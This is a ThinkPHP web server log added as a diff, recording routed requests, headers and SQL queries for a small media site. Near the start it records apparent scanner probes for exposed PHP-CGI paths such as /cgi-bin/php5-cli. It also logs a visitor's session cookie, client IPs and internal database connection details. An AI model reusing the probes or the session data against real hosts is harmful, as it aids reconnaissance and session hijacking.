+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:09+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php4
+[ log ] 123.207.34.110/cgi-bin/php4 [运行时间：0.012734s][吞吐率：78.53req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php4',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:09+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php5-cli
+[ log ] 123.207.34.110/cgi-bin/php5-cli [运行时间：0.011977s][吞吐率：83.49req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php5-cli',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:10+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/test.cgi
+[ log ] 123.207.34.110/cgi-bin/test.cgi [运行时间：0.013540s][吞吐率：73.86req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'test.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:10+08:00 ] 172.16.0.5 107.170.96.6 GET /
+[ log ] 123.207.34.110/ [运行时间：0.016001s][吞吐率：62.50req/s] [内存消耗：1,680.80kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
+  'host' => '123.207.34.110',
+  'accept-charset' => 'ISO-8859-1;utf-8;q=0.7,*;q=0.7',
+  'accept' => '*/*',
+  'proxy-connection' => 'Close',
+  'connection' => 'Close',
+  'referer' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:44:11+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-sys/php5
+[ log ] 123.207.34.110/cgi-sys/php5 [运行时间：0.011503s][吞吐率：86.93req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-sys',
+    1 => 'php5',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T14:49:11+08:00 ] 172.16.0.5 183.136.190.42 GET /
+[ log ] www.00it.cn/ [运行时间：0.014071s][吞吐率：71.07req/s] [内存消耗：1,678.45kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T15:37:52+08:00 ] 172.16.0.5 14.152.68.234 GET /
+[ log ] zard-forever.com/ [运行时间：0.015972s][吞吐率：62.61req/s] [内存消耗：1,682.09kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=259200',
+  'host' => 'zard-forever.com',
+  'x-forwarded-for' => '117.136.32.48',
+  'cookie' => 'PHPSESSID=c8d4om2cgsc1deo1jcr2hmc5kp',
+  'clientip' => '117.136.32.48',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; CAM-AL00 Build/HONORCAM-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.8.968 Mobile Safari/537.36',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T15:38:10+08:00 ] 172.16.0.5 117.136.32.48 GET /index/mv/index.html
+[ log ] zard-forever.com/index/mv/index.html [运行时间：0.026199s][吞吐率：38.17req/s] [内存消耗：2,687.48kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'mv',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-ucbrowser-ua' => 'dv(CAM-AL00);pr(UCBrowser/11.8.8.968);ov(Android 6.0);ss(360*604);pi(720*1208);bt(YZ);pm(0);bv(1);nm(0);im(0);sr(0);nt(1);',
+  'cookie' => 'PHPSESSID=c8d4om2cgsc1deo1jcr2hmc5kp',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://zard-forever.com/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; CAM-AL00 Build/HONORCAM-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.8.968 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000323s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000830s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000229s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T15:38:12+08:00 ] 172.16.0.5 117.136.32.48 GET /index/mv/index.html?page=2
+[ log ] zard-forever.com/index/mv/index.html?page=2 [运行时间：0.023831s][吞吐率：41.96req/s] [内存消耗：2,687.88kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'mv',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-ucbrowser-ua' => 'dv(CAM-AL00);pr(UCBrowser/11.8.8.968);ov(Android 6.0);ss(360*604);pi(720*1208);bt(YZ);pm(0);bv(1);nm(0);im(0);sr(0);nt(1);',
+  'cookie' => 'PHPSESSID=c8d4om2cgsc1deo1jcr2hmc5kp',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; CAM-AL00 Build/HONORCAM-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.8.968 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => '2',
+)
+[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000271s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000578s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000147s ]
+[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 20,20 [ RunTime:0.000173s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T15:39:03+08:00 ] 172.16.0.5 117.136.32.48 GET /index/picture/index.html
+[ log ] zard-forever.com/index/picture/index.html [运行时间：0.021470s][吞吐率：46.58req/s] [内存消耗：2,598.60kb] [文件加载：55]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'picture',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-ucbrowser-ua' => 'dv(CAM-AL00);pr(UCBrowser/11.8.8.968);ov(Android 6.0);ss(360*604);pi(720*1208);bt(YZ);pm(0);bv(1);nm(0);im(0);sr(0);nt(1);',
+  'cookie' => 'PHPSESSID=c8d4om2cgsc1deo1jcr2hmc5kp',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://zard-forever.com/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; CAM-AL00 Build/HONORCAM-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.8.968 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
+  0 => 'picture',
+  1 => 'first_selected',
+  2 => 'second_selected',
+  3 => 'first',
+  4 => 'second',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000230s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000181s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T15:39:04+08:00 ] 172.16.0.5 183.136.190.51 GET /index/picture/index.html
+[ log ] www.00it.cn/index/picture/index.html [运行时间：0.025046s][吞吐率：39.93req/s] [内存消耗：2,593.42kb] [文件加载：55]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'picture',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
+  0 => 'picture',
+  1 => 'first_selected',
+  2 => 'second_selected',
+  3 => 'first',
+  4 => 'second',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000236s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000559s ]
+[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000167s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T15:39:29+08:00 ] 172.16.0.5 183.136.190.42 GET /index/music/index.html
+[ log ] www.00it.cn/index/music/index.html [运行时间：0.023552s][吞吐率：42.46req/s] [内存消耗：2,726.40kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'music',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Music->index[ /home/www/WWW/application/index/controller/Music.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/music/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000231s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `music` [ RunTime:0.000609s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `music` LIMIT 1 [ RunTime:0.000110s ]
+[ sql ] [ SQL ] SELECT * FROM `music` ORDER BY issue_time asc LIMIT 0,20 [ RunTime:0.000146s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T15:40:13+08:00 ] 172.16.0.5 183.136.190.42 GET /index/index/suggestion.html
+[ log ] www.00it.cn/index/index/suggestion.html [运行时间：0.014000s][吞吐率：71.43req/s] [内存消耗：1,665.14kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'suggestion',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->suggestion[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/suggestion.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T15:59:27+08:00 ] 172.16.0.5 101.226.68.215 GET /index/picture/index.html
+[ log ] www.00it.cn/index/picture/index.html [运行时间：0.030501s][吞吐率：32.79req/s] [内存消耗：2,594.05kb] [文件加载：55]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'picture',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
+  0 => 'picture',
+  1 => 'first_selected',
+  2 => 'second_selected',
+  3 => 'first',
+  4 => 'second',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000262s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000587s ]
+[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000189s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T16:19:45+08:00 ] 172.16.0.5 60.191.52.254 HEAD /
+[ log ] wap.ip138.com/ [运行时间：0.013783s][吞吐率：72.55req/s] [内存消耗：1,677.95kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'proxy-connection' => 'keep-alive',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => 'wap.ip138.com',
+  'user-agent' => 'Java/1.8.0_77',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T16:21:51+08:00 ] 172.16.0.5 66.249.65.85 GET /
+[ log ] cx.00it.cn/ [运行时间：0.014364s][吞吐率：69.62req/s] [内存消耗：1,678.96kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'host' => 'cx.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T16:28:29+08:00 ] 172.16.0.5 183.57.53.197 GET /index/index/friendly_link.html
+[ log ] www.00it.cn/index/index/friendly_link.html [运行时间：0.013887s][吞吐率：72.01req/s] [内存消耗：1,666.84kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'friendly_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->friendly_link[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/friendly_link.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T17:07:48+08:00 ] 172.16.0.5 60.191.38.77 GET /
+[ log ] 123.207.34.110:80/ [运行时间：0.014608s][吞吐率：68.46req/s] [内存消耗：1,678.49kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.207.34.110:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T17:24:04+08:00 ] 172.16.0.5 47.93.90.175 GET /
+[ log ] 58.87.71.112:80/ [运行时间：0.014295s][吞吐率：69.96req/s] [内存消耗：1,677.85kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'Close',
+  'host' => '58.87.71.112:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T17:27:24+08:00 ] 172.16.0.5 183.136.190.55 GET /
+[ log ] www.00it.cn/ [运行时间：0.013805s][吞吐率：72.44req/s] [内存消耗：1,678.45kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
